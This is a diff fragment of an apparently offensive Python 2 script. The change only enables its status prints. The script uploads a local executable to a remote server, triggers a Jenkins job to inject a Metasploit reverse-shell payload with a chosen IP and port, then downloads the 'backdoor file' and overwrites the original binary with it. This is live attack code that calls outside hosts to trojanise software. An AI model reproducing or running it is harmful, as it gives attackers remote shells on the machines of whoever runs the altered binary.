@@ -35,7 +35,7 @@ payloadPort = args.port
 payloadIP = args.rip
 if args.pay == 1:
     if not args.rip:
-        #print '-rip parameter required when using MSF TCP Reverse Shell Payload'
+        print '-rip parameter required when using MSF TCP Reverse Shell Payload'
         parser.print_help()
         sys.exit(1)
     else:
@@ -65,8 +65,8 @@ if os.name == 'nt':
     fileLocation += '\\'
 fileName = os.path.basename(binaryPath)
 uploadFileName = str(uuid.uuid4())
-#print '[*]name is ' + fileLocation + fileName
-#print '[*]uploading ' + uploadFileName
+print '[*]name is ' + fileLocation + fileName
+print '[*]uploading ' + uploadFileName
 
 # read file
 fileData = file(binaryPath).read()
@@ -76,7 +76,7 @@ uploadDir = indir + uploadFileName
 # put file
 uploadURL = hostIP + '/' + putfn + uploadDir
 
-#print '[*] PUT file ' + uploadURL
+print '[*] PUT file ' + uploadURL
 req = MethodRequest(url=uploadURL, method='PUT', data=fileData)
 res = urllib2.urlopen(req)
 
@@ -87,12 +87,12 @@ Optionally append &cause=Cause+Text to provide text that will be included in the
 # trigger Jenkins job
 bulid_prams = '/job/' + jenkins_bn + '/buildWithParameters?token=' + jenkins_key + '&delay=0' +'&dir=' + uploadFileName  + '&Payload_Type=' + str(payloadType) + '&port=' + str(payloadPort) + '&IP=' +  payloadIP + '&binName=' + fileLocation + fileName
 jenkins_url = jenkinsIP + bulid_prams
-#print '[*] Jenkins URL ' + jenkins_url
+print '[*] Jenkins URL ' + jenkins_url
 
 #req = MethodRequest(
 req2 = urllib2.urlopen(jenkins_url)
 if req2.getcode() == 201:
-    #print '[*] SUCCESS'
+    print '[*] SUCCESS'
     # call URL with params
 
 # poll for backdoor file for 2 minutes, every 30 seconds
@@ -100,19 +100,19 @@ endTime = time.time() + 120
 downloadURL = hostIP + outdir + uploadFileName
 time.sleep(2)
 while time.time() < endTime:
-    #print '[*] trying to get file...' + downloadURL
+    print '[*] trying to get file...' + downloadURL
     try:
         f = urllib2.urlopen(downloadURL)
         if f.getcode() == 200:
             data = f.read()
             writeName = os.path.join(fileLocation, fileName)
-            #print 'writing to...' + writeName
+            print 'writing to...' + writeName
             with open(writeName, "wb") as code:
                 code.write(data)
                 '[*] wrote file'
                 break
         else:
-            #print '[*] didn\'t get file...sleeping'
+            print '[*] didn\'t get file...sleeping'
             time.sleep(30)
     except:
         time.sleep(30)
